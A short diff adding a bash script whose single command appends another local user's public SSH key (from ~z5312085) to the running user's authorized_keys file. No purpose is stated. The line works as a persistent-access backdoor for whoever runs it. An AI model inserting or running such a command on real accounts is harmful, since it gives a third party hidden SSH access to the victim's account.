@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+
+cat ~z5312085/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
